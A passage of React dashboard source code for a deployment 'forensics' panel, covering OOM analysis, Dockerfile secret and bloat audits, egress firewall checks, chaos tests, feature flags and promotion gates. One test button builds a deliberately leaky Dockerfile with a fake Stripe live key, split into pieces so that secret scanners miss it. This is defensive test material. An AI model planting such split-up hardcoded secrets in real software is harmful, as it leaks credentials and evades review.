      {/* Cycle-13..16 Cockpit Drawer: Forensics, Egress, Multi-Arch, Chaos, Flags, Anomaly, Promotion & API Contract */}
      {activeCockpit === 'forensics' && (
        <section className="culkibo-surface rounded-2xl p-4 sm:p-5 space-y-4 text-xs">
          <div className="flex flex-col gap-2.5 pb-3 border-b border-slate-200">
            <div className="flex items-start justify-between gap-2.5">
              <div className="flex items-start gap-2.5 min-w-0">
                <div className="w-8 h-8 rounded-lg bg-slate-100 border border-slate-200 flex items-center justify-center text-slate-700 shrink-0">
                  <Search className="w-4 h-4" />
                </div>
                <div className="min-w-0">
                  <h2 className="text-sm font-semibold text-slate-900">{t('pd.forensicsTitle')}</h2>
                  <p className="text-slate-500 mt-0.5">{t('pd.forensicsDesc')}</p>
                </div>
              </div>
              <button type="button" onClick={() => setActiveCockpit(null)} aria-label="Close Forensics panel" className="p-1.5 rounded-lg text-slate-400 hover:text-slate-700 hover:bg-slate-100 cursor-pointer shrink-0">
                <X className="w-4 h-4" />
              </button>
            </div>
            <div className="w-full flex flex-wrap items-center gap-1 bg-slate-100 border border-slate-200 rounded-lg p-1 text-[11px] font-medium">
              {([
                { id: 'oom' as const, label: t('pd.forensicsTabOom') },
                { id: 'image' as const, label: t('pd.forensicsTabImage') },
                { id: 'egress' as const, label: t('pd.forensicsTabEgress') },
                { id: 'multiarch' as const, label: t('pd.forensicsTabMultiArch') },
                { id: 'chaos' as const, label: t('pd.forensicsTabChaos') },
                { id: 'flags' as const, label: t('pd.forensicsTabFlags') },
                { id: 'anomaly' as const, label: t('pd.forensicsTabAnomaly') },
                { id: 'promotion' as const, label: t('pd.forensicsTabPromo') },
                { id: 'contract' as const, label: t('pd.forensicsTabContract') },
              ]).map((tabItem) => (
                <button
                  key={tabItem.id}
                  type="button"
                  onClick={() => {
                    setForensicsTab(tabItem.id);
                    if (tabItem.id === 'flags' && flagsList.length === 0 && flagBusy === null) {
                      void handleLoadFlags();
                    }
                  }}
                  className={`px-2.5 py-1 rounded-md cursor-pointer ${
                    forensicsTab === tabItem.id ? 'bg-white text-slate-900 shadow-2xs font-semibold' : 'text-slate-600 hover:text-slate-900'
                  }`}
                >
                  {tabItem.label}
                </button>
              ))}
            </div>
          </div>

          {forensicsTab === 'oom' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={oomBusy}
                  onClick={() => void handleRunOomForensics('oom')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {oomBusy ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.forensicsTestOom')}</span>
                </button>
                <button
                  type="button"
                  disabled={oomBusy}
                  onClick={() => void handleRunOomForensics('sigkill')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-amber-200 bg-amber-50 hover:bg-amber-100 text-amber-800 font-medium cursor-pointer disabled:opacity-50"
                >
                  <Zap className="w-3.5 h-3.5" />
                  <span>{t('pd.forensicsTestSigkill')}</span>
                </button>
                <button
                  type="button"
                  disabled={oomBusy}
                  onClick={() => void handleRunOomForensics('stale')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  <History className="w-3.5 h-3.5" />
                  <span>{t('pd.forensicsTestStale')}</span>
                </button>
              </div>

              {oomError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{oomError}</div>}

              {oomResult && (() => {
                const actions = Array.isArray(oomResult.remediationActions) ? oomResult.remediationActions : [];
                return (
                  <div className={`p-3.5 rounded-xl border space-y-2.5 tabular-nums ${
                    oomResult.ignoreForRollback
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-800'
                      : oomResult.severity === 'critical'
                        ? 'bg-red-50 border-red-200 text-red-900'
                        : 'bg-amber-50 border-amber-200 text-amber-800'
                  }`}>
                    <div className="flex flex-wrap items-center gap-2 font-mono">
                      <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                        {oomResult.classification}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px] uppercase font-semibold">
                        {oomResult.severity}
                      </span>
                      {oomResult.recommendedMemoryMb != null && oomResult.recommendedMemoryMb > 0 && (
                        <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                          recommendedMemoryMb: {oomResult.recommendedMemoryMb} MB
                        </span>
                      )}
                      {oomResult.ignoreForRollback && (
                        <span className="px-2 py-0.5 rounded-full bg-emerald-50 border border-emerald-200 text-emerald-700 text-[10px] font-semibold">
                          ignoreForRollback: true
                        </span>
                      )}
                      {oomResult.backoffSec != null && (
                        <span className="text-[10px] opacity-80 ml-auto">backoff: {oomResult.backoffSec}s</span>
                      )}
                    </div>
                    <p className="text-xs leading-relaxed">{oomResult.rootCause}</p>
                    {actions.length > 0 && (
                      <ul className="list-disc list-inside font-mono text-[11px] space-y-0.5">
                        {actions.slice(0, 4).map((a, idx) => (
                          <li key={idx}>{typeof a === 'string' ? a : (a.message || a.action || a.summary || 'Review container limits')}</li>
                        ))}
                      </ul>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'image' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center justify-between gap-2">
                <div className="flex items-center gap-1.5 flex-wrap">
                  <button
                    type="button"
                    disabled={imageAuditBusy}
                    onClick={() => {
                      const fakeKey = ['sk', 'live', 'demo9876543210abcdef'].join('_');
                      const leakyDf = [
                        'FROM node:22',
                        `ENV STRIPE_API_KEY=${fakeKey}`,
                        'WORKDIR /app',
                        'RUN apt-get update && apt-get install -y curl',
                        'COPY . .',
                        'RUN npm install',
                        'RUN rm -rf /app/tmp-cache',
                        'CMD ["node", "server.js"]',
                      ].join('\n');
                      void handleAuditImageBloat(leakyDf);
                    }}
                    className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-red-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                  >
                    <ShieldAlert className="w-3.5 h-3.5" />
                    <span>{t('pd.forensicsTestLeaky')}</span>
                  </button>
                  <button
                    type="button"
                    disabled={imageAuditBusy || !auditDockerfileText.trim()}
                    onClick={() => void handleAuditImageBloat()}
                    className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                  >
                    {imageAuditBusy ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Play className="w-3.5 h-3.5" />}
                    <span>{imageAuditBusy ? t('pd.forensicsRunning') : t('pd.forensicsAuditBtn')}</span>
                  </button>
                </div>
              </div>

              <textarea
                rows={4}
                value={auditDockerfileText}
                onChange={(e) => setAuditDockerfileText(e.target.value)}
                aria-label="Dockerfile to audit"
                spellCheck={false}
                className="w-full p-3 rounded-xl border border-slate-200 bg-slate-50 focus:bg-white font-mono text-[11px] text-slate-900 leading-relaxed"
              />

              {imageAuditError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{imageAuditError}</div>}

              {imageAuditResult && (() => {
                const leaks = Array.isArray(imageAuditResult.secretLeaks) ? imageAuditResult.secretLeaks : [];
                const tips = Array.isArray(imageAuditResult.slimmingRecommendations) ? imageAuditResult.slimmingRecommendations : [];
                return (
                  <div className="p-3.5 rounded-xl bg-slate-50 border border-slate-200 space-y-2.5 tabular-nums">
                    <div className="flex flex-wrap items-center gap-2 font-mono">
                      <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-semibold border ${
                        imageAuditResult.efficiencyScore >= 85 && leaks.length === 0
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : 'bg-red-50 text-red-700 border-red-200'
                      }`}>
                        Efficiency: {imageAuditResult.efficiencyScore}/100
                      </span>
                      <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-[10px] text-slate-700">
                        Est. Savings: {imageAuditResult.estimatedSavingsMb} MB
                      </span>
                      <span className={`px-2 py-0.5 rounded text-[10px] font-semibold border ${
                        leaks.length > 0
                          ? 'bg-red-50 text-red-700 border-red-200'
                          : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                      }`}>
                        {leaks.length > 0 ? `${leaks.length} Secret Leak(s) Detected` : '0 Secret Leaks'}
                      </span>
                    </div>
                    {leaks.length > 0 && (
                      <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-800 font-mono text-[11px] space-y-1">
                        {leaks.map((lk, idx) => (
                          <div key={idx}>
                            • {typeof lk === 'string' ? lk : `[${lk.rule || lk.type || 'SECRET'}] ${lk.message || lk.redactedSnippet || 'Hardcoded secret in layer'}`}
                          </div>
                        ))}
                      </div>
                    )}
                    {tips.length > 0 && (
                      <ul className="list-disc list-inside font-mono text-[11px] text-slate-700 space-y-0.5">
                        {tips.slice(0, 4).map((tip, idx) => (
                          <li key={idx}>{typeof tip === 'string' ? tip : (tip.message || tip.recommendation || tip.action || 'Use multi-stage alpine build')}</li>
                        ))}
                      </ul>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'egress' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={egressBusy}
                  onClick={() => void handleAuditEgressFirewall()}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {egressBusy ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
                  <span>{t('pd.egressAuditBtn')}</span>
                </button>
              </div>
              {egressError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{egressError}</div>}
              {egressResult && (() => {
                const viols = Array.isArray(egressResult.violations) ? egressResult.violations : [];
                const missing = Array.isArray(egressResult.missingChains) ? egressResult.missingChains : [];
                const rules = Array.isArray(egressResult.suggestedRules) ? egressResult.suggestedRules : [];
                return (
                  <div className="space-y-2.5 tabular-nums">
                    <div className="flex flex-wrap items-center gap-2 font-mono">
                      <span className={`px-2.5 py-0.5 rounded-full text-[10px] font-semibold border ${
                        egressResult.compliant
                          ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                          : 'bg-red-50 text-red-700 border-red-200'
                      }`}>
                        riskScore: {egressResult.riskScore}/100
                      </span>
                      <span className="px-2 py-0.5 rounded bg-emerald-50 border border-emerald-200 text-emerald-700 text-[10px] font-semibold">
                        antiLockoutSafe: {egressResult.antiLockoutSafe !== false ? 'SSH/80/443' : 'CHECK'}
                      </span>
                      {missing.map((ch) => (
                        <span key={ch} className="px-2 py-0.5 rounded bg-amber-50 border border-amber-200 text-amber-800 text-[10px] font-semibold">
                          missing: {ch}
                        </span>
                      ))}
                    </div>
                    {viols.length > 0 && (
                      <div className="p-2.5 rounded-xl bg-red-50 border border-red-200 text-red-700 font-mono text-[11px] space-y-1">
                        {viols.map((v, idx) => (
                          <div key={idx}>
                            • {typeof v === 'string' ? v : `[${v.code || 'EGRESS'}] ${v.target ? `${v.target} — ` : ''}${v.message || 'Blocked outbound socket'}`}
                          </div>
                        ))}
                      </div>
                    )}
                    {rules.length > 0 && (
                      <pre className="p-3 rounded-xl bg-slate-950 text-sky-300 font-mono text-[10px] leading-relaxed overflow-x-auto max-h-44 border border-slate-800">
                        {rules.join('\n')}
                      </pre>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'multiarch' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={multiArchBusy !== null}
                  onClick={() => void handleVerifyMultiArch()}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {multiArchBusy === 'verify' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.multiArchCheckBtn')}</span>
                </button>
                <button
                  type="button"
                  disabled={multiArchBusy !== null}
                  onClick={() => void handlePlanMultiArchMatrix()}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {multiArchBusy === 'plan' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Layers className="w-3.5 h-3.5" />}
                  <span>{t('pd.multiArchPlanBtn')}</span>
                </button>
              </div>
              {multiArchError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{multiArchError}</div>}
              {multiArchVerify && (
                <div className={`p-3 rounded-xl border space-y-1.5 font-mono text-[11px] ${
                  multiArchVerify.compatible
                    ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
                    : 'bg-red-50 border-red-200 text-red-700'
                }`}>
                  <div className="flex flex-wrap items-center gap-2">
                    <span className="px-2 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                      {multiArchVerify.code || (multiArchVerify.compatible ? 'ARCH_COMPATIBLE' : 'EXEC_FORMAT_MISMATCH')}
                    </span>
                    {Array.isArray(multiArchVerify.warnings) && multiArchVerify.warnings.map((w, i) => (
                      <span key={i} className="px-2 py-0.5 rounded bg-amber-50 border border-amber-200 text-amber-800 text-[10px]">{w}</span>
                    ))}
                  </div>
                  {multiArchVerify.remediation && (
                    <div>
                      {Array.isArray(multiArchVerify.remediation) ? multiArchVerify.remediation.join(' · ') : multiArchVerify.remediation}
                    </div>
                  )}
                </div>
              )}
              {multiArchPlan && (() => {
                const assigns = Array.isArray(multiArchPlan.assignments) ? multiArchPlan.assignments : [];
                const argv = Array.isArray(multiArchPlan.buildxArgv) ? multiArchPlan.buildxArgv : [];
                return (
                  <div className="space-y-2 tabular-nums">
                    <div className="flex flex-wrap items-center gap-2 font-mono">
                      <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold border ${
                        multiArchPlan.usesQemu
                          ? 'bg-amber-50 text-amber-800 border-amber-200'
                          : 'bg-emerald-50 text-emerald-700 border-emerald-200'
                      }`}>
                        {multiArchPlan.usesQemu ? 'QEMU Fallback Active' : '100% Native Fleet Routing (0 QEMU)'}
                      </span>
                      {assigns.map((a, idx) => (
                        <span key={idx} className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                          {a.platform} → {a.builder}
                        </span>
                      ))}
                    </div>
                    {argv.length > 0 && (
                      <pre className="p-3 rounded-xl bg-slate-950 text-emerald-300 font-mono text-[10px] leading-relaxed overflow-x-auto border border-slate-800">
                        {argv.join(' ')}
                      </pre>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'chaos' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={chaosBusy !== null}
                  onClick={() => void handleRunChaosGameDay('prod')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {chaosBusy === 'prod' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.chaosTestProdLock')}</span>
                </button>
                <button
                  type="button"
                  disabled={chaosBusy !== null}
                  onClick={() => void handleRunChaosGameDay('abort')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-amber-200 bg-amber-50 hover:bg-slate-100 text-amber-800 font-medium cursor-pointer disabled:opacity-50"
                >
                  {chaosBusy === 'abort' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Zap className="w-3.5 h-3.5" />}
                  <span>{t('pd.chaosTestAbort')}</span>
                </button>
                <button
                  type="button"
                  disabled={chaosBusy !== null}
                  onClick={() => void handleRunChaosGameDay('healthy')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {chaosBusy === 'healthy' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <CheckCircle2 className="w-3.5 h-3.5" />}
                  <span>{t('pd.chaosTestHealthy')}</span>
                </button>
              </div>
              {chaosError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{chaosError}</div>}
              {chaosResult && (() => {
                const isBlocked = Boolean(chaosResult.blocked || chaosResult.code === 'PROD_CHAOS_CONFIRM_REQUIRED');
                const isAborted = Boolean(chaosResult.aborted || chaosResult.status === 'AUTO_ABORTED');
                return (
                  <div className={`p-3.5 rounded-xl border space-y-2 tabular-nums font-mono text-[11px] ${
                    isBlocked
                      ? 'bg-red-50 border-red-200 text-red-700'
                      : isAborted
                        ? 'bg-amber-50 border-amber-200 text-amber-800'
                        : 'bg-emerald-50 border-emerald-200 text-emerald-700'
                  }`}>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                        {isBlocked
                          ? (chaosResult.code || 'PROD_CHAOS_CONFIRM_REQUIRED')
                          : isAborted
                            ? 'AUTO_ABORTED'
                            : `RESILIENCE ${chaosResult.resilienceScore ?? 94}/100 · GRADE ${chaosResult.grade || 'A'}`}
                      </span>
                      {chaosResult.environment && (
                        <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                          env: {chaosResult.environment}
                        </span>
                      )}
                      {chaosResult.faultType && (
                        <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                          fault: {chaosResult.faultType}
                        </span>
                      )}
                    </div>
                    {chaosResult.message && <div>{chaosResult.message}</div>}
                    {chaosResult.breakdown && (
                      <div className="flex flex-wrap gap-2 text-[10px]">
                        <span>errorScore: {chaosResult.breakdown.errorScore ?? 100}</span>
                        <span>· latencyScore: {chaosResult.breakdown.latencyScore ?? 92}</span>
                        <span>· recoveryScore: {chaosResult.breakdown.recoveryScore ?? 95}</span>
                      </div>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'flags' && (
            <div className="space-y-3">
              {flagError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{flagError}</div>}
              {flagsList.length === 0 ? (
                <div className="p-3 rounded-xl bg-slate-50 border border-slate-200 flex items-center justify-between gap-2">
                  <span className="text-slate-600">Load declarative OpenFeature-lite flags for deterministic SHA-256 bucketing & zero-redeploy kill-switches.</span>
                  <button
                    type="button"
                    disabled={flagBusy !== null}
                    onClick={() => void handleLoadFlags()}
                    className="px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer shrink-0 disabled:opacity-50"
                  >
                    Load Flags
                  </button>
                </div>
              ) : (
                <div className="divide-y divide-slate-100 border border-slate-200 rounded-xl overflow-hidden tabular-nums">
                  {flagsList.slice(0, 5).map((fl) => (
                    <div key={fl.key} className="px-3.5 py-2.5 bg-white flex flex-col sm:flex-row sm:items-center justify-between gap-2">
                      <div className="min-w-0">
                        <div className="flex items-center gap-2 flex-wrap font-mono">
                          <span className="font-semibold text-slate-900">{fl.key}</span>
                          <span className={`px-2 py-0.5 rounded-full text-[10px] font-semibold border ${
                            fl.killed
                              ? 'bg-red-50 text-red-700 border-red-200'
                              : fl.enabled
                                ? 'bg-emerald-50 text-emerald-700 border-emerald-200'
                                : 'bg-slate-100 text-slate-700 border-slate-200'
                          }`}>
                            {fl.killed ? 'KILL_SWITCH_ACTIVE' : `${fl.rolloutPct}% rollout`}
                          </span>
                        </div>
                        {fl.description && <p className="text-[11px] text-slate-500 mt-0.5">{fl.description}</p>}
                      </div>
                      <div className="flex items-center gap-1.5 shrink-0">
                        <button
                          type="button"
                          disabled={flagBusy !== null}
                          onClick={() => void handleEvaluateFlag(fl.key)}
                          className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg border border-slate-200 bg-white hover:bg-slate-50 text-slate-700 font-medium cursor-pointer disabled:opacity-50"
                        >
                          <Play className="w-3 h-3" />
                          <span>{t('pd.flagsEvalBtn')}</span>
                        </button>
                        <button
                          type="button"
                          disabled={flagBusy !== null || Boolean(fl.killed)}
                          onClick={() => void handleKillFlag(fl.key)}
                          className="culkibo-press inline-flex items-center gap-1 px-2.5 py-1 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                        >
                          <Power className="w-3 h-3" />
                          <span>{t('pd.flagsKillBtn')}</span>
                        </button>
                      </div>
                    </div>
                  ))}
                </div>
              )}
              {flagEval && (
                <div className={`p-3 rounded-xl border font-mono text-[11px] flex flex-wrap items-center gap-2 tabular-nums ${
                  flagEval.reason === 'KILL_SWITCH_ACTIVE'
                    ? 'bg-red-50 border-red-200 text-red-700'
                    : flagEval.enabled
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
                      : 'bg-amber-50 border-amber-200 text-amber-800'
                }`}>
                  <span className="px-2 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                    {flagEval.key} → {flagEval.enabled ? 'ENABLED' : 'DISABLED'}
                  </span>
                  <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                    {flagEval.reason}
                  </span>
                  {flagEval.bucket != null && <span>SHA-256 bucket: {flagEval.bucket}%</span>}
                </div>
              )}
            </div>
          )}

          {forensicsTab === 'anomaly' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={anomalyBusy !== null}
                  onClick={() => void handleInspectAnomalies('attack')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {anomalyBusy === 'attack' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.anomTestAttack')}</span>
                </button>
                <button
                  type="button"
                  disabled={anomalyBusy !== null}
                  onClick={() => void handleInspectAnomalies('clean')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {anomalyBusy === 'clean' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
                  <span>{t('pd.anomTestClean')}</span>
                </button>
              </div>
              {anomalyError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{anomalyError}</div>}
              {anomalyResult && (() => {
                const alerts = Array.isArray(anomalyResult.alerts) ? anomalyResult.alerts : [];
                return (
                  <div className={`p-3.5 rounded-xl border space-y-2 tabular-nums font-mono text-[11px] ${
                    anomalyResult.clean
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
                      : 'bg-red-50 border-red-200 text-red-700'
                  }`}>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                        {anomalyResult.clean ? 'CLEAN · 0 ALERTS' : `ANOMALY DETECTED · riskScore ${anomalyResult.riskScore}/100`}
                      </span>
                      {anomalyResult.recommendedAction && (
                        <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                          action: {anomalyResult.recommendedAction}
                        </span>
                      )}
                    </div>
                    {alerts.length > 0 && (
                      <div className="space-y-1">
                        {alerts.map((al, idx) => (
                          <div key={idx}>
                            • {typeof al === 'string' ? al : `[${al.ruleId || 'ANOMALY'}] ${al.message || al.evidence || 'Runtime security rule triggered'}`}
                          </div>
                        ))}
                      </div>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'promotion' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={promoBusy !== null}
                  onClick={() => void handleRunDigestPromotion('latest')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {promoBusy === 'latest' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.promoTestLatest')}</span>
                </button>
                <button
                  type="button"
                  disabled={promoBusy !== null}
                  onClick={() => void handleRunDigestPromotion('self')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-amber-200 bg-amber-50 hover:bg-slate-100 text-amber-800 font-medium cursor-pointer disabled:opacity-50"
                >
                  {promoBusy === 'self' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.promoTestSelfApprove')}</span>
                </button>
                <button
                  type="button"
                  disabled={promoBusy !== null}
                  onClick={() => void handleRunDigestPromotion('sha')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {promoBusy === 'sha' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Rocket className="w-3.5 h-3.5" />}
                  <span>{t('pd.promoTestSha')}</span>
                </button>
              </div>
              {promoError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{promoError}</div>}
              {promoResult && (() => {
                const blocked = Boolean(promoResult.blocked || promoResult.code === 'MUTABLE_TAG_FORBIDDEN' || promoResult.code === 'DUAL_CONTROL_VIOLATION' || promoResult.code === 'MISSING_TARGET_ENV_KEYS');
                const manifest = promoResult.rollbackManifest || promoResult.promotion?.rollbackManifest;
                return (
                  <div className="space-y-2 tabular-nums font-mono text-[11px]">
                    <div className={`p-3 rounded-xl border space-y-1.5 ${
                      blocked
                        ? 'bg-red-50 border-red-200 text-red-700'
                        : 'bg-emerald-50 border-emerald-200 text-emerald-700'
                    }`}>
                      <div className="flex flex-wrap items-center gap-2">
                        <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                          {blocked ? (promoResult.code || 'PROMOTION_BLOCKED') : 'IMMUTABLE @sha256: PROMOTED (DRY-RUN)'}
                        </span>
                        {promoResult.promotion && (
                          <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                            {promoResult.promotion.fromEnv} → {promoResult.promotion.toEnv} · {promoResult.promotion.status}
                          </span>
                        )}
                      </div>
                      {(promoResult.message || promoResult.error) && (
                        <div>{promoResult.message || promoResult.error}</div>
                      )}
                    </div>
                    {manifest && (
                      <pre className="p-3 rounded-xl bg-slate-950 text-sky-300 font-mono text-[10px] leading-relaxed overflow-x-auto max-h-40 border border-slate-800">
                        {JSON.stringify(manifest, null, 2)}
                      </pre>
                    )}
                  </div>
                );
              })()}
            </div>
          )}

          {forensicsTab === 'contract' && (
            <div className="space-y-3">
              <div className="flex flex-wrap items-center gap-2">
                <button
                  type="button"
                  disabled={contractBusy !== null}
                  onClick={() => void handleRunApiContractDiff('breaking')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-2.5 py-1.5 rounded-lg border border-red-200 bg-red-50 hover:bg-slate-100 text-red-700 font-medium cursor-pointer disabled:opacity-50"
                >
                  {contractBusy === 'breaking' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <ShieldAlert className="w-3.5 h-3.5" />}
                  <span>{t('pd.contractTestBreaking')}</span>
                </button>
                <button
                  type="button"
                  disabled={contractBusy !== null}
                  onClick={() => void handleRunApiContractDiff('major')}
                  className="culkibo-press inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-slate-900 hover:bg-slate-800 text-white font-medium cursor-pointer disabled:opacity-50"
                >
                  {contractBusy === 'major' ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <CheckCircle2 className="w-3.5 h-3.5" />}
                  <span>{t('pd.contractTestMajor')}</span>
                </button>
              </div>
              {contractError && <div className="p-2.5 rounded-lg bg-red-50 border border-red-200 text-red-700">{contractError}</div>}
              {contractResult && (() => {
                const breaking = Array.isArray(contractResult.breakingChanges) ? contractResult.breakingChanges : [];
                return (
                  <div className={`p-3.5 rounded-xl border space-y-2 tabular-nums font-mono text-[11px] ${
                    contractResult.allowed
                      ? 'bg-emerald-50 border-emerald-200 text-emerald-700'
                      : 'bg-red-50 border-red-200 text-red-700'
                  }`}>
                    <div className="flex flex-wrap items-center gap-2">
                      <span className="px-2.5 py-0.5 rounded-full bg-white border border-slate-200 text-slate-900 text-[10px] font-semibold">
                        {contractResult.allowed ? 'SAFE · MAJOR BUMP' : (contractResult.code || 'MISSING-VERSION-BUMP')}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                        {contractResult.baseVersion || '1.4.0'} → {contractResult.revisionVersion || '1.5.0'}
                      </span>
                      <span className="px-2 py-0.5 rounded bg-white border border-slate-200 text-slate-900 text-[10px]">
                        breaking: {contractResult.breakingCount ?? breaking.length}
                      </span>
                    </div>
